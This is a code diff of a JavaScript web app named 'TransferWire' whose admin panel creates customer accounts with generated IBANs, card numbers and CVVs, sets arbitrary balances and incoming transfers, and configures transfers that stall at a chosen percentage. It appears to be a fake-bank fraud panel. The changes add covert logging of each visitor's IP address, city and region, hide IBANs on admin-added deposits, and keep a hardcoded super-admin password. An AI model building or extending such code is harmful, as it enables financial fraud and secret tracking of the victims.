@@ -1,6 +1,6 @@
 // =====================================================
 // TRANSFERWIRE - SCRIPT PRINCIPAL
-// v46 - i18n complet + Textes sans majuscules
+// v47 - Suivi connexion client + IBAN masqué virements reçus
 // =====================================================
 
 import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js';
@@ -18,7 +18,7 @@ const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 const auth = getAuth(app);
 
-/* 🔑 Mot de passe Super Admin (changez-le !) */
+/* 🔑 Mot de passe Super Admin */
 const SUPER_ADMIN_PASSWORD = 'SuperAdmin@TW2026';
 
 /* ===================================================== */
@@ -52,6 +52,44 @@ async function sendEmail({ to, name, subject, html, text }) {
     });
     return res.ok;
   } catch (e) { console.error('Email send error:', e); return false; }
+}
+
+/* ===================================================== */
+/* ✅ NOUVEAU : Suivi de connexion client */
+/* ===================================================== */
+async function trackClientSession(clientId, isOnline) {
+  try {
+    const updateData = { isOnline: isOnline };
+    if (isOnline) {
+      const now = new Date();
+      updateData.lastLoginAt = now.toLocaleDateString('fr-FR') + ' ' + now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' });
+      updateData.lastLoginTimestamp = now.getTime();
+      updateData.lastLoginDateISO = now.toISOString();
+      try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 4000);
+        const res = await fetch('https://ipwho.is/', { signal: controller.signal });
+        clearTimeout(timeoutId);
+        const data = await res.json();
+        if (data && data.success !== false) {
+          updateData.lastLoginCountry = data.country || '—';
+          updateData.lastLoginCountryCode = data.country_code || '';
+          updateData.lastLoginCity = data.city || '—';
+          updateData.lastLoginRegion = data.region || '—';
+          updateData.lastLoginIp = data.ip || '—';
+        }
+      } catch (e) {
+        try {
+          const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '—';
+          updateData.lastLoginCountry = tz;
+          updateData.lastLoginCity = '—';
+          updateData.lastLoginRegion = '—';
+          updateData.lastLoginIp = '—';
+        } catch (e2) { updateData.lastLoginCountry = '—'; }
+      }
+    }
+    await FireDB.updateClient(clientId, updateData);
+  } catch (e) { console.error('track session error', e); }
 }
 
 /* ===================================================== */
@@ -234,20 +272,11 @@ function buildReceiptEmail(client, tx, status, lang, percent) {
   const theme = '#1a73e8';
   let statusColor, statusText, titleText, introText;
   if (status === 'done') {
-    statusColor = '#10b981';
-    statusText = T.receiptStatusDone;
-    titleText = T.receiptTitle;
-    introText = T.receiptSuccessIntro;
+    statusColor = '#10b981'; statusText = T.receiptStatusDone; titleText = T.receiptTitle; introText = T.receiptSuccessIntro;
   } else if (status === 'cancelled') {
-    statusColor = '#8b5cf6';
-    statusText = T.receiptStatusCancelled;
-    titleText = T.receiptCancelTitle;
-    introText = T.receiptCancelledIntro;
+    statusColor = '#8b5cf6'; statusText = T.receiptStatusCancelled; titleText = T.receiptCancelTitle; introText = T.receiptCancelledIntro;
   } else {
-    statusColor = '#dc2626';
-    statusText = T.receiptStatusFailed.replace('{percent}', percent || 0);
-    titleText = T.receiptFailedTitle;
-    introText = T.receiptFailedIntro.replace('{percent}', percent || 0);
+    statusColor = '#dc2626'; statusText = T.receiptStatusFailed.replace('{percent}', percent || 0); titleText = T.receiptFailedTitle; introText = T.receiptFailedIntro.replace('{percent}', percent || 0);
   }
   const amount = tx.amount || '-';
   const ref = 'TW-' + (tx.date || '').replace(/[^0-9]/g, '').slice(-10);
@@ -438,9 +467,6 @@ window.addEventListener('popstate', async (event) => {
   setTimeout(() => { isHandlingPop = false; }, 150);
 });
 
-/* ===================================================== */
-/* ✅ i18n COMPLET (TOUTES les langues traduites) */
-/* ===================================================== */
 const i18n = {
   pl: {
     loginTitle: "Zaloguj się na swoje konto", emailPh: "Twój adres e-mail", pinPh: "Twój kod dostępu", loginBtn: "Zaloguj się", loginErr: "Nieprawidłowy e-mail lub PIN.", greeting: "Witaj",
@@ -615,7 +641,7 @@ function renderQuickActions() {
 
 function renderTransactions(txs) {
   currentTransactions = txs || [];
-  if (!txs || txs.length === 0) return '<p style="color:#94a3b8;font-size:11px;text-align:center;padding:15px 0;">' + t('noTransactions') + '</p>';
+  if (!txs || txs.length === 0) return '<p style="color:#1e293b;font-size:11px;text-align:center;padding:15px 0;font-weight:600;">' + t('noTransactions') + '</p>';
   let h = '';
   txs.forEach((tx, idx) => {
     const isCancelled = tx.type === 'cancelled';
@@ -702,6 +728,8 @@ function renderLoginPage(client) {
       if (!fresh) { hideLoader(); window.showNotif(t('msgInvalidLink'), 'error'); return; }
       if (fresh.blocked) { hideLoader(); window.showNotif(t('msgAccountSuspended'), 'error'); return; }
       ClientSession.setActive(client.id);
+      // ✅ NOUVEAU : Enregistre la connexion (pays, date, heure)
+      trackClientSession(client.id, true);
       replaceHistory('screen-dashboard');
       setTimeout(() => { initClient(); hideLoader(); }, 350);
     } else { document.getElementById('error-msg').style.display = 'block'; }
@@ -770,6 +798,8 @@ function renderBankingApp(client) {
 
 window.ClientLogout = function() {
   if (clientUnsubscribe) { try { clientUnsubscribe(); } catch (e) {} clientUnsubscribe = null; }
+  // ✅ NOUVEAU : Marque le client comme déconnecté
+  if (currentClient && currentClient.id) trackClientSession(currentClient.id, false);
   ClientSession.clear();
   replaceLoginHistory();
   initClient();
@@ -798,6 +828,9 @@ window.cancelTransfer = function() {
   window.navigateTo('screen-transfer');
 };
 
+/* ===================================================== */
+/* ✅ MODIFIÉ : IBAN non affiché pour les virements reçus (admin) */
+/* ===================================================== */
 window.openReceipt = function(idx) {
   if (!currentTransactions || !currentTransactions[idx]) return;
   const tx = currentTransactions[idx];
@@ -822,17 +855,15 @@ window.openReceipt = function(idx) {
   }
   const ref = 'TW-' + (tx.date || '').replace(/[^0-9]/g, '').slice(-8) + '-' + String(idx + 1).padStart(3, '0');
   const labelTo = (isIn || isCancelled) ? t('receiptFrom') : t('receiptTo');
+
+  // ✅ IBAN affiché UNIQUEMENT pour les virements sortants (envoyés par le client)
+  // Les virements reçus (ajoutés par l'admin) et annulés n'affichent PAS l'IBAN.
   let accountRow = '';
   if (!isIn && !isCancelled) {
     const recipientIban = tx.recipientIban || tx.iban || '—';
     accountRow = '<div class="receipt-row"><div class="receipt-row-label">' + t('receiptRecipientAccount') + '</div><div class="receipt-row-value receipt-mono">' + (formatIban(recipientIban) || '—') + '</div></div>';
-  } else if (isCancelled) {
-    const recipientIban = tx.recipientIban || '—';
-    accountRow = '<div class="receipt-row"><div class="receipt-row-label">' + t('receiptRecipientAccount') + '</div><div class="receipt-row-value receipt-mono">' + (formatIban(recipientIban) || '—') + '</div></div>';
-  } else {
-    const senderIban = tx.senderIban || currentClient.iban || '';
-    accountRow = '<div class="receipt-row"><div class="receipt-row-label">' + t('receiptSenderAccount') + '</div><div class="receipt-row-value receipt-mono">' + (formatIban(senderIban) || '—') + '</div></div>';
   }
+
   const ov = document.createElement('div');
   ov.id = 'receipt-modal-dynamic'; ov.className = 'receipt-overlay';
   ov.innerHTML = '<div class="receipt-modal">' +
@@ -1316,7 +1347,8 @@ async function renderAdminPage() {
     const generatedCardNumber = generateCardNumber(); const generatedCardExpiry = generateCardExpiry(); const generatedCardCvv = generateCardCvv();
     const now = new Date(); const dateStr = now.toLocaleDateString('fr-FR') + ' ' + now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' });
     const initialTransactions = initialBalance > 0 ? [{ type: 'in', labelKey: 'txInitialDeposit', subtitle: bankNameValue || '', amount: formatAmount(initialBalance, currencyValue), date: dateStr, senderIban: generatedIban }] : [];
-    const clientData = { adminUid: currentAdmin.uid, adminEmail: currentAdmin.email, lastName: document.getElementById('lastName').value, firstName: document.getElementById('firstName').value, country: countryValue, phone: document.getElementById('phone').value, email: document.getElementById('email').value, address: document.getElementById('address').value, language: document.getElementById('language').value, bankName: bankNameValue, iban: generatedIban, bic: generatedBic, ibanMasked: false, cardHolder: '', cardNumber: generatedCardNumber, cardExpiry: generatedCardExpiry, cardCvv: generatedCardCvv, cardType: 'Visa Debit', cardMaskLast4: false, cardMaskCvv: false, balance: initialBalance, currency: currencyValue, startPercent: parseInt(document.getElementById('startPercent').value), stopPercent: parseInt(document.getElementById('stopPercent').value), pin: document.getElementById('pin').value, activationCode: document.getElementById('activationCode').value, message: document.getElementById('message').value, themeColor: document.getElementById('themeColor').value, blocked: false, transactions: initialTransactions };
+    // ✅ MODIFIÉ : ibanMasked/cardMaskLast4/cardMaskCvv mis à true par défaut (masqué automatiquement)
+    const clientData = { adminUid: currentAdmin.uid, adminEmail: currentAdmin.email, lastName: document.getElementById('lastName').value, firstName: document.getElementById('firstName').value, country: countryValue, phone: document.getElementById('phone').value, email: document.getElementById('email').value, address: document.getElementById('address').value, language: document.getElementById('language').value, bankName: bankNameValue, iban: generatedIban, bic: generatedBic, ibanMasked: true, cardHolder: '', cardNumber: generatedCardNumber, cardExpiry: generatedCardExpiry, cardCvv: generatedCardCvv, cardType: 'Visa Debit', cardMaskLast4: true, cardMaskCvv: true, balance: initialBalance, currency: currencyValue, startPercent: parseInt(document.getElementById('startPercent').value), stopPercent: parseInt(document.getElementById('stopPercent').value), pin: document.getElementById('pin').value, activationCode: document.getElementById('activationCode').value, message: document.getElementById('message').value, themeColor: document.getElementById('themeColor').value, blocked: false, isOnline: false, transactions: initialTransactions };
     const ok = await FireDB.createClient(id, clientData);
     if (ok) { window.showNotif('Le client a ete cree avec succes.', 'success', 'Client cree'); renderAdminPage(); }
     else window.showNotif('Erreur lors de la creation du client.', 'error');
@@ -1325,6 +1357,9 @@ async function renderAdminPage() {
 
 window.refreshAdminPage = function() { renderAdminPage(); };
 
+/* ===================================================== */
+/* ✅ MODIFIÉ : Ajout de la section Connexion dans le détail client */
+/* ===================================================== */
 window.openClientDetail = async function(id) {
   if (!currentAdmin || !currentAdmin.uid) return;
   const c = await FireDB.getClient(id);
@@ -1346,16 +1381,37 @@ window.openClientDetail = async function(id) {
   if (txs.length === 0) { transfersHtml = '<div class="admin-transfers-empty">Aucun virement effectue</div>'; }
   else { let itemsHtml = ''; txs.forEach((tx) => { const realIdx = (c.transactions || []).indexOf(tx); const isCancelled = tx.type === 'cancelled'; const txName = tx.subtitle || '—'; const txAmount = tx.amount || '—'; const txDate = tx.date || ''; const cancelBtn = isCancelled ? '' : '<button class="admin-transfer-cancel-btn" onclick="window.cancelClientTransfer(\'' + id + '\',' + realIdx + ')">Annuler</button>'; itemsHtml += '<div class="admin-transfer-item' + (isCancelled ? ' cancelled' : '') + '"><div class="admin-transfer-info"><div class="admin-transfer-name" onclick="window.openTransferDetailModal(\'' + id + '\',' + realIdx + ')">' + txName + '</div><div class="admin-transfer-meta">' + txDate + (isCancelled ? ' · Annule' : '') + '</div></div><div class="admin-transfer-amount">' + txAmount + '</div>' + cancelBtn + '</div>'; }); transfersHtml = itemsHtml; }
   const transfersCard = '<div class="admin-transfers-card"><div class="admin-transfers-title"><svg viewBox="0 0 24 24"><path d="M6.99 11L3 15l3.99 4v-3H14v-2H6.99v-3zM21 9l-3.99-4v3H10v2h7.01v3L21 9z"/></svg><span>Virements effectues</span></div>' + transfersHtml + '</div>';
+
+  // ✅ NOUVEAU : Bloc de statut de connexion
+  const isOnline = c.isOnline === true;
+  const onlineColor = isOnline ? '#16a34a' : '#dc2626';
+  const onlineBg = isOnline ? '#dcfce7' : '#fee2e2';
+  const onlineLabel = isOnline ? '● En ligne' : '● Hors ligne';
+  const connectionBlock = '<div class="connection-status-card">' +
+      '<div class="connection-status-header" style="background:' + onlineBg + ';color:' + onlineColor + ';">' +
+        '<span class="connection-status-dot" style="background:' + onlineColor + ';"></span>' +
+        '<span class="connection-status-text">' + onlineLabel + '</span>' +
+      '</div>' +
+      '<div class="connection-status-body">' +
+        row('Derniere connexion', c.lastLoginAt || 'Jamais') +
+        row('Pays de connexion', c.lastLoginCountry || '—') +
+        (c.lastLoginCity && c.lastLoginCity !== '—' ? row('Ville', c.lastLoginCity) : '') +
+        (c.lastLoginRegion && c.lastLoginRegion !== '—' ? row('Region', c.lastLoginRegion) : '') +
+        (c.lastLoginIp && c.lastLoginIp !== '—' ? row('Adresse IP', c.lastLoginIp, true) : '') +
+      '</div>' +
+    '</div>';
+
   ov.innerHTML = '<div style="background:#fff!important;border-radius:16px!important;width:100%!important;max-width:420px!important;margin:0 auto!important;box-shadow:0 20px 50px rgba(0,0,0,0.4)!important;">' +
     '<div class="detail-header"><div class="detail-avatar">' + ((c.firstName || '').charAt(0) + (c.lastName || '').charAt(0)).toUpperCase() + '</div><div style="flex:1!important;min-width:0!important;"><div class="detail-name">' + c.firstName + ' ' + c.lastName + '</div><div class="detail-email">' + c.email + '</div></div><button class="detail-close" onclick="document.getElementById(\'client-detail-modal\').remove()"><svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg></button></div>' +
     '<div class="detail-body">' +
       '<div class="detail-status-grid"><div class="detail-status-box ' + (c.blocked ? 'blocked' : 'active') + '"><div class="detail-status-label">Statut</div><div class="detail-status-value">' + (c.blocked ? 'Suspendu' : 'Actif') + '</div></div><div class="detail-status-box balance"><div class="detail-status-label">Solde</div><div class="detail-status-value">' + balance + '</div></div></div>' +
+      sectionTitle('Connexion au compte') + connectionBlock +
       transfersCard +
       sectionTitle('Identite') + row('Nom', c.lastName) + row('Prenom', c.firstName) + row('Pays', c.country) + row('Langue', langNames[c.language] || c.language) +
       sectionTitle('Contact') + row('Email', c.email) + row('Telephone', c.phone) + row('Adresse', c.address) +
       sectionTitle('Securite') + row('Code PIN', c.pin, true) + row('Code activation', c.activationCode, true) +
       sectionTitle('Banque / IBAN') + row('Banque', c.bankName) + row('IBAN', c.iban, true) + row('BIC / SWIFT', c.bic, true) + row('IBAN masque', c.ibanMasked === true ? 'Oui' : 'Non') +
-      sectionTitle('Carte virtuelle') + row('Titulaire', cardHolder) + row('Numero', c.cardNumber, true) + row('Expiration', c.cardExpiry) + row('CVV', c.cardCvv, true) + row('Type', c.cardType) +
+      sectionTitle('Carte virtuelle') + row('Titulaire', cardHolder) + row('Numero', c.cardNumber, true) + row('Expiration', c.cardExpiry) + row('CVV', c.cardCvv, true) + row('Type', c.cardType) + row('4 derniers masques', c.cardMaskLast4 === true ? 'Oui' : 'Non') + row('CVV masque', c.cardMaskCvv === true ? 'Oui' : 'Non') +
       sectionTitle('Parametres transfert') + row('Depart %', (c.startPercent || 0) + '%') + row('Arret %', (c.stopPercent || 100) + '%') + row('Message de fin', c.message) + row('Couleur du theme', c.themeColor || '#1a73e8') +
       sectionTitle('Lien client') + '<div class="detail-link-box">' + clientLink + '</div>' +
       '<div class="detail-footer" style="grid-template-columns:1fr;gap:8px;">' +
